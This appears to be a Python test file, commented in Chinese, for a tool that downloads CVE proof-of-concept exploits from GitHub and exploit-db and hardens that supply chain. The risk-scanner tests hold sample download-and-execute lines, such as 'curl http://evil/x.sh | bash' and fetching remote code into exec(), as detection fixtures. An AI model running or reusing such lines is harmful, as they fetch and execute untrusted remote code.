"""POC 下载逻辑测试：GitHub 下载/死链/扩展名/exploit-db，mock 网络，离线可跑。"""
import os

import poc_downloader
from poc_downloader import (
    download_poc_for_cve, _is_poc_file, _parse_github_blob,
    _poc_risk_scan, _community_poc_verified,
)


def _result(url, is_poc=True):
    return {"cve_id": "CVE-2024-0001", "references": [{"url": url, "is_poc": is_poc, "poc_source": "tag" if is_poc else "none"}]}


def test_github_download_writes_file(fake_github, tmp_output):
    fake_github(
        files=["exploit.py"],
        raw_map={"exploit.py": b"#!/usr/bin/env python\nprint('poc')"},
    )
    result = _result("https://github.com/foo/bar/blob/main/exploit.py")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert ref.get("poc_local"), "应有本地路径"
    assert ref.get("download_status") == "ok"
    assert ref.get("downloaded_at"), "应有下载时间戳"
    # 文件确实落盘（扁平：直接放固件目录，文件名带 CVE 前缀）
    base = os.path.join(tmp_output, "Test_Device")
    assert os.path.isdir(base)
    files = os.listdir(base)
    assert files, "目录应有文件"
    assert any(f.startswith("CVE-2024-0001_") for f in files), "文件名应带 CVE 前缀"


def test_github_dead_link_detected(fake_github, tmp_output):
    # 仓库里没有 blob 指向的文件 → 死链
    fake_github(files=["readme.md"], raw_map={})
    result = _result("https://github.com/foo/bar/blob/main/exploit.py")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert ref.get("download_skipped") == "引用文件已失效（可能被作者删除）"
    assert ref.get("download_status") == "failed"


def test_non_github_source_skipped(fake_github, tmp_output):
    result = _result("https://example.com/blog/foo")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert "非代码型源" in ref.get("download_skipped", "")


def test_repo_no_poc_files_skipped(fake_github, tmp_output):
    # 仓库有文件但都不是 POC 代码
    fake_github(files=["README.md", "screenshot.png"], raw_map={})
    result = _result("https://github.com/foo/bar")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert "无 POC" in ref.get("download_skipped", "")


def test_exploitdb_download(monkeypatch, tmp_output):
    class FakeResp:
        status_code = 200
        content = b"#!/usr/bin/env python\nprint('exploit')"
        headers = {"Content-Type": "text/plain"}

    class FakeSess:
        def get(self, *a, **k):
            return FakeResp()

    monkeypatch.setattr(poc_downloader, "_session", lambda: FakeSess())
    result = _result("https://www.exploit-db.com/exploits/40805/")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert ref.get("poc_local"), "exploit-db 应下载成功"
    assert ref.get("downloaded_at")


# ---------- 过滤 / 解析纯函数 ----------

def test_is_poc_file_filter():
    assert _is_poc_file("poc.py")
    assert _is_poc_file("exploit.sh")
    assert _is_poc_file("CVE-2024-0001-exploit.rb")
    assert not _is_poc_file("README.md")
    assert not _is_poc_file("screenshot.png")
    assert not _is_poc_file("utils.py")   # 是代码但名字不含 poc/exploit


def test_parse_github_blob():
    assert _parse_github_blob("https://github.com/foo/bar/blob/main/exploit.py") == ("foo", "bar", "exploit.py")
    assert _parse_github_blob("https://github.com/foo/bar") is None
    assert _parse_github_blob("https://github.com/foo/bar/tree/main/src") is None


# ---------- 供应链加固回归测试 ----------

def test_github_download_records_commit_sha(fake_github, tmp_output):
    """下载应 pin commit SHA（fake_github 的 _repo_head_sha 返回 testsha123）。"""
    fake_github(files=["exploit.py"], raw_map={"exploit.py": b"print('poc')"})
    result = _result("https://github.com/foo/bar/blob/main/exploit.py")
    download_poc_for_cve(result, "Test_Device")
    ref = result["references"][0]
    assert ref.get("commit_sha") == "testsha123"
    assert ref.get("commit_pinned") is True


def test_github_download_passes_pinned_ref(monkeypatch, tmp_output):
    """列树与 raw 下载应传 pin 住的 commit SHA（防 HEAD 漂移/指向被篡改）。"""
    monkeypatch.setattr(poc_downloader, "_repo_head_sha", lambda owner, repo: "testsha123")
    seen = {}
    monkeypatch.setattr(poc_downloader, "list_repo_files",
                        lambda owner, repo, ref=None: seen.update(list_ref=ref) or (["exploit.py"], 200))
    monkeypatch.setattr(poc_downloader, "download_raw",
                        lambda owner, repo, path, ref=None: seen.update(raw_ref=ref) or (b"x", 200))
    result = _result("https://github.com/foo/bar")
    download_poc_for_cve(result, "Test_Device")
    assert seen.get("list_ref") == "testsha123"
    assert seen.get("raw_ref") == "testsha123"


def test_community_search_filters_fork_archived(monkeypatch):
    """社区 POC 搜索必须排除 fork 与已归档仓库（防攻击者借 fork 投毒）。"""
    captured = {}

    class FakeResp:
        status_code = 200

        def json(self):
            return {"items": []}

    def fake_get(url, **kw):
        captured.update(kw.get("params", {}))
        return FakeResp()

    monkeypatch.setattr(poc_downloader, "_safe_get", fake_get)
    poc_downloader.search_github_poc_repos("CVE-2024-0001")
    q = captured.get("q", "")
    assert "fork:false" in q
    assert "archived:false" in q


# ---------- 社区 POC 静态风险扫描 ----------

def test_poc_risk_scan_flags_download_execute():
    ok, reason = _poc_risk_scan(b"#!/bin/sh\ncurl http://evil/x.sh | bash\n")
    assert ok is False
    assert "curl|sh" in reason


def test_poc_risk_scan_flags_remote_eval():
    ok, reason = _poc_risk_scan(b"import requests\ncode = requests.get('http://x/a.py').text\nexec(code)")
    assert ok is False
    assert "远程拉取后 eval/exec" in reason


def test_poc_risk_scan_safe_passes():
    ok, reason = _poc_risk_scan(b"#!/usr/bin/env python\nimport socket\ns.connect(('1.2.3.4', 9999))\n")
    assert ok is True
    assert reason == "static_ok"


def test_community_poc_verified_allowlist(monkeypatch):
    """白名单仓库跳过扫描直接视为已验证。"""
    monkeypatch.setattr(poc_downloader, "VERIFIED_POC_REPOS", {"foo/bar"})
    ok, reason = _community_poc_verified("foo", "bar", b"curl http://x | sh")
    assert ok is True
    assert reason == "allowlist"
    # 非白名单仓库 → 走扫描，命中危险模式 → 不可信
    ok, reason = _community_poc_verified("foo", "other", b"curl http://x | sh")
    assert ok is False
